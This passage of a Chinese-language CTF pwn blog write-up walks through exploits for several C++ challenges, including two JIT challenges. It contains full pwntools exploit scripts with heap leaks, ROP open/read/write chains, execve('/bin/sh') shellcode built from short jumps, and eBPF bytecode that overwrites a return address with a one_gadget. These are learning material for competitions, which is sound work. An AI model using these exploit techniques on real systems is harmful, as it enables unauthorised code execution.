class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0xdeadbeaf</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    edit(i+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0x11111</span>))<br><br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>heap_base = u32(rc(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x5710</span><br><br>libc.address = u32(ru(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:]) - <span class="hljs-number">0x1e8780</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4ba9</span>))<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>elf_base = u32(rc(<span class="hljs-number">3</span>).rjust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x0c&#x27;</span>)) - <span class="hljs-number">0x4e0c</span><br>leak(<span class="hljs-string">&quot;elf&quot;</span>,elf_base)<br><br>lea_ret =  <span class="hljs-number">0x00110226</span>+libc.address<br>add_esp_1c = <span class="hljs-number">0x0001b034</span> + libc.address<br>ret = libc.address + <span class="hljs-number">0x0001922e</span><br>add_esp_4 = <span class="hljs-number">0x0002fe0e</span> + libc.address<br>add_esp_8 = <span class="hljs-number">0x0002fbe9</span> + libc.address<br>add_esp_c = <span class="hljs-number">0x0001b90a</span> + libc.address<br>int_0x80 = <span class="hljs-number">0x000312f5</span> + libc.address<br>pop_eax = <span class="hljs-number">0x000282eb</span> + libc.address<br>pop_ebx = <span class="hljs-number">0x0001de56</span> + libc.address<br>pop_ecx_edx = <span class="hljs-number">0x00030ea3</span> + libc.address<br>payload = flat([<br>    heap_base+<span class="hljs-number">0x54e8</span>,add_esp_1c,<br>    <span class="hljs-number">0x22222222</span>,<span class="hljs-number">0x33333333</span>,<span class="hljs-number">0x44444444</span>,<span class="hljs-number">0x55555555</span>,<span class="hljs-number">0x66666666</span>,<br>    lea_ret,<span class="hljs-number">0x88888888</span>,<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>],<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,heap_base+<span class="hljs-number">0x5524</span>,<br>])<br><br>orw = flat([<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],add_esp_8,heap_base+<span class="hljs-number">0x4c2f</span>,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],add_esp_1c,<span class="hljs-number">3</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br>    ret,ret,ret,ret,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],add_esp_1c,<span class="hljs-number">1</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br><br>])<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x11111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x1</span>))<br><br>edit(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0x4</span>) + p32(heap_base+<span class="hljs-number">0x54a8</span>)*<span class="hljs-number">3</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>)*<span class="hljs-number">4</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>) +p32(<span class="hljs-number">0x2044</span>+elf_base))<br><br>edit(<span class="hljs-number">3</span>,payload)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;......................................../flag&#x27;</span>)<br>leak(<span class="hljs-string">&quot;heap&quot;</span>,heap_base)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x204c)\nc\n&quot;</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4bd9</span>))<br>show(<span class="hljs-number">0</span>)<br><br>sl(orw)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>额exp写的很乱，凑合着看吧</p><h2 id="西葫芦🗡-2023-JIT-😭"><a href="#西葫芦🗡-2023-JIT-😭" class="headerlink" title="西葫芦🗡 2023 JIT 😭"></a>西葫芦🗡 2023 JIT 😭</h2><p>今年年初的西葫芦🗡是👴第一次打大比赛，当初👴还不懂事，出了两道简单题后还不知好歹，看了一眼jit，当时就被吓得亚麻呆住了。</p><p>刨坟挖出来康康题，结果逆了一天逆了个大概，第二天一直在想怎么能把<code>shellcode</code>写到<code>exec_memory</code>里，最后还是看了rode👴的wp，用了<code>jmp short</code> 的短指令完成系统调用。</p><h3 id="逆亿下🤮🤮"><a href="#逆亿下🤮🤮" class="headerlink" title="逆亿下🤮🤮"></a>逆亿下🤮🤮</h3><p>整体逻辑还行</p><p>mmap了一个具有rwx权限的<code>memory</code>，经过<code>Compiler::handleFn</code>处理后，输入的内容会变成<code>memory</code>出的汇编，最后执行。</p><p>一个个来看</p><p>这个算是个对<code>exec_memory</code>的初始化</p><p><img src="/img/C++/14.png" alt="img"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">Compiler::</span>handleFn`函数里面，会读取输入的第一个字节，要求为\xff，并读取第<span class="hljs-number">1</span>、<span class="hljs-number">2</span>个字节为`args`和`locals<br></code></pre></td></tr></table></figure><p><img src="/img/C++/15.png" alt="img"></p><p>进入<code>Compiler::creatFunc</code>，<code>args</code> 要 小于8，<code>locals</code>要小于0x20，然后在<code>exec_memory</code>里用<code>sub rsp, 8*locals</code>开一个栈空间</p><p><img src="/img/C++/16.png" alt="img"></p><p>然后进入核心函数<code>Compiler::handleFnBody()</code></p><p>里面的<code>Compiler::var2idx</code>是将传入的参数进行处理，动调一下发现是[rbp - ret_value*8]</p><p>存在整数溢出漏洞，可以看到上层函数接受返回值的参数是单字节的，所以当varib为0xa0时可以使返回值为0，可以直接对rbp进行操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">char</span> __cdecl <span class="hljs-title">Compiler::var2idx</span><span class="hljs-params">(u8 varib)</span></span><br><span class="hljs-function"></span>&#123;<br>  u8 variba; <span class="hljs-comment">// [rsp+Ch] [rbp-1Ch]</span><br><br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x7F</span>) == <span class="hljs-number">0</span> )              <span class="hljs-comment">//varib!=0x7f </span><br>    <span class="hljs-built_in">fatal</span>();<br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x80</span>u) == <span class="hljs-number">0</span> )             <span class="hljs-comment">//varib &lt; 0x80</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( varib &gt; Compiler::ctx_args )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">8</span> * varib) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">8</span> * varib;<br>  &#125;<br>  <span class="hljs-keyword">else</span>                  <span class="hljs-number">1000</span>     <span class="hljs-number">1010</span>             <span class="hljs-comment">//varib &gt; 0x80</span><br>  &#123;<br>    variba = varib ^ <span class="hljs-number">0x80</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(varib ^ <span class="hljs-number">0x80</span>) &gt; Compiler::ctx_locals )    <span class="hljs-comment">//当locals设置为max 0x20,varib max = 0xa0</span><br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">-8</span> * variba) &gt; <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-8</span> * variba;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/C++/17.png" alt="img"></p><p>后面就是0-5的<code>opcode</code>，6的利用条件太tm烦了👴就没看</p><p>基本上就是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        v0 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// 感觉是ret</span><br>        <span class="hljs-keyword">return</span> Compiler::<span class="hljs-built_in">var2idx</span>(v0);<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        v2 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// mov [rbp - var],num</span><br>        var = Compiler::<span class="hljs-built_in">var2idx</span>(v2);<br>        imm = IRstream::<span class="hljs-built_in">getimm</span>();<br>        AsmHelper::<span class="hljs-built_in">imm2var</span>(var, imm);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1 = Compiler::<span class="hljs-built_in">var2idx</span>(v3);<br>        v4 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2 = Compiler::<span class="hljs-built_in">var2idx</span>(v4);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2);               <span class="hljs-comment">// mov [rbp-var2],[rbp-var1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1);<br>        AsmHelper::<span class="hljs-built_in">regassign</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        v5 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v5);<br>        v6 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v6);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_0);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_0);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x21</span>u);             <span class="hljs-comment">// and [rbp-var2_0],[rbp-var1_0]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        v7 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v7);<br>        v8 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v8);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_1);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_1);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">9u</span>);                <span class="hljs-comment">// or [rbp-var2-1],[rbp-var1_1]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        v9 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v9);<br>        v10 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v10);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_2);             <span class="hljs-comment">// xor [rbp-var2_2],[rbp-var2_1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_2);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x31</span>u);<br>        <span class="hljs-keyword">break</span>;<br>       <br></code></pre></td></tr></table></figure><p>最后<code>AsmHelper::func_ret</code>恢复栈帧，这样<code>just in time</code> 基本上就好了</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">JITHelper::</span>finailize()`将`exec_memory`的`rwx`权限改为`r_x<br></code></pre></td></tr></table></figure><p>后面的一连串check是使第一次转汇编的输入的<code>id</code>和<code>args</code>必须为0</p><p><img src="/img/C++/18.png" alt="img"></p><p>然后就是执行了<code>exec_memory</code>了</p><h3 id="利用🏳️🏳️"><a href="#利用🏳️🏳️" class="headerlink" title="利用🏳️🏳️"></a>利用🏳️🏳️</h3><p>那么问题来了，执行的时候没有<code>write</code>权限，👴该怎么往上写<code>shellcode</code>呢</p><p>👴一开始想的是在栈上布置<code>rop</code>链，但是要先泄露<code>libc</code>，也<code>pass</code>了</p><p>这是怎么绘事捏</p><p>后来看了rode👴的wp，又学到了新的东西</p><p>因为case 1中mov到栈上的是8字节，于是可以是<code>“xor rax, rax; jmp short&quot;</code>这种短跳转代码，那👴懂啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x1ddf)\nc\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\xff\x00\x00\x20&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8b&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>                            <span class="hljs-comment">#mov [rbp-0xb*8], /bin/sh</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8a&#x27;</span> + p64(<span class="hljs-number">0xffffffffff00</span>)                       <span class="hljs-comment">#mov [rbp-0xa*8], 0xffffffffff00</span><br>payload += <span class="hljs-string">b&#x27;\x01\x89&#x27;</span> + p64(<span class="hljs-number">0x47</span>)                                 <span class="hljs-comment">#mov [rbp-9*8], 0x47</span><br>payload += <span class="hljs-string">b&#x27;\x01\x88&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xf6\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rsi, rsi; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x87&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xd2\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rdx, rdx; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x86&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xc0\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rax, rax; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x85&#x27;</span> + <span class="hljs-string">b&quot;\x04\x3b\xeb\x0d\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#add al, 0x3b; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x84&#x27;</span> + <span class="hljs-string">b&quot;\x0f\x05\x00\x00\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#syscall</span><br>payload += <span class="hljs-string">b&#x27;\x03\xa0\x8a&#x27;</span>                                         <span class="hljs-comment">#and [rbp], [rbp-0xa*8]</span><br>payload += <span class="hljs-string">b&#x27;\x04\xa0\x89&#x27;</span>                                         <span class="hljs-comment">#or [rbp], [rbp-9*8]</span><br>payload += <span class="hljs-string">b&#x27;\x00\x8b&#x27;</span>                                             <span class="hljs-comment">#mov rdi,[rbp-b*8];ret</span><br><br>sd(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="WMCTF-2023-JIT🥵"><a href="#WMCTF-2023-JIT🥵" class="headerlink" title="WMCTF 2023 JIT🥵"></a>WMCTF 2023 JIT🥵</h2><p>just in time ，又是你！！</p><p>👴只是想把C++pwn题学明白，👴有什么错，要拿2000行的屎山代码来恶心👴</p><h3 id="再逆亿下"><a href="#再逆亿下" class="headerlink" title="再逆亿下"></a>再逆亿下</h3><p>先输入<code>program</code>和<code>memory</code>，<code>program</code>要是16进制字符串，<code>memory</code>要是<code>len(program) //2</code></p><p><img src="/img/C++/19.png" alt="img"></p><p>这边大致是创建虚拟机并进行一系列初始化的过程，具体操作👴也没逆明白</p><p><img src="/img/C++/20.png" alt="img"></p><p>然后就是核心<code>code</code></p><p><img src="/img/C++/21.png" alt="img"></p><p><code>func_8510</code>里，通过<code>func_84e0--&gt;func_8370--&gt;func_5a50</code>这个2000行的屎山把输入的<code>program</code>翻译成汇编存储在申请出来的<code>chunk</code>里</p><p><code>mmap</code>一片内存，把<code>chunk</code>里的汇编<code>copy</code>过去，然后<code>mprotect</code>改成<code>r_x</code>权限</p><p><code>call rax</code>就是执行翻译的汇编</p><p><img src="/img/C++/22.png" alt="img"></p><p>最后有个<code>result</code>输出的是执行完后的寄存器<code>rax</code>值</p><p>差不多了，快吐了</p><p>😭😭😭</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>问题来了，那个2000行的代码等👴看完估计是天都亮了，👴果断去看wp，发现很多👴都说这是<code>ebpf</code></p><p>👴：？？？</p><p>👴：妈妈生的，这是个什么玩意</p><p>然后👴就去找这玩意的<a href="https://github.com/iovisor/bpf-docs/blob/master/eBPF.md">指令集</a></p><p>一试，对上了，那就好办了</p><p>先连上找个libc值给rax，打印出来康康libc版本</p><p>然后就是ogg覆盖返回地址，因为👴莫得找到syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-comment"># rax:0</span><br><span class="hljs-comment"># rdi:1</span><br><span class="hljs-comment"># rsi:2</span><br><span class="hljs-comment"># rdx:3</span><br><span class="hljs-comment"># r9:4</span><br><span class="hljs-comment"># r8:5</span><br><span class="hljs-comment"># rbx:6</span><br><span class="hljs-comment"># r13:7</span><br><span class="hljs-comment"># r14:8</span><br><span class="hljs-comment"># r15:9</span><br><span class="hljs-comment"># rbp:a</span><br><br>program = <span class="hljs-string">b&#x27;61a0380100000000&#x27;</span>   <span class="hljs-comment">#mov eax,[rbp-0x138]</span><br>program += <span class="hljs-string">b&#x27;1400000083400200&#x27;</span>  <span class="hljs-comment">#sub eax,libc.sym[&#x27;__libc_start_main&#x27;]+243</span><br>program += <span class="hljs-string">b&#x27;04000000043b0e00&#x27;</span>  <span class="hljs-comment">#add eax,ogg</span><br>program += <span class="hljs-string">b&#x27;7b8a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],r14</span><br>program += <span class="hljs-string">b&#x27;630a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],eax</span><br>program += <span class="hljs-string">b&#x27;af22000000000000&#x27;</span>  <span class="hljs-comment">#xor rsi, rsi</span><br>program += <span class="hljs-string">b&#x27;af33000000000000&#x27;</span>  <span class="hljs-comment">#xor rdx, rdx</span><br>memory = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(program)//<span class="hljs-number">2</span>).encode()<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x2947)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,program)<br>leak(<span class="hljs-string">&quot;libc_start_main&quot;</span>,libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">243</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,memory)<br><br><br><span class="hljs-comment"># 0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [r12] == NULL || r12 == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [rsi] == NULL || rsi == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>不知道是不是👴的错觉，<code>JIT</code>总给👴一种用<code>shellcode</code>完成利用方式的<code>vm</code>题</p><p>真的逆吐惹🤮🤮🤮</p><p>而且👴有一个问题，怎么那么多👴看到题一眼就知道是<code>ebpf</code>？？？</p><p>后续：</p><p><img src="/img/C++/23.png" alt="img"></p><p>👴&lt;——🤡🤡🤡🤡🤡</p><h1 id="0xff-写在最后的最后"><a href="#0xff-写在最后的最后" class="headerlink" title="0xff:写在最后的最后"></a>0xff:写在最后的最后</h1><p>逆不动了，真tm逆不动了，汗流浃背了已经🥵🥵🥵</p><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://zqy.ink/2023/05/12/dingjiqiandao/">N1CTF Junior 2023 pwn 顶级签到 赛题复现 | 张清越 (zqy.ink)</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md">6.1 Pwn - 6.1.8 pwn DCTF2017 Flex - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack</a></p><p><a href="https://www.anquanke.com/post/id/89855#h3-8">Shanghai-DCTF-2017 线下攻防Pwn题-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://arttnba3.cn/2021/01/20/CTF-0X02-STARCTF2021-PWN/#0x02-babygame-double-free-tcache-poisoning">【CTF.0X02】*CTF2021-Pwn WP - arttnba3’s 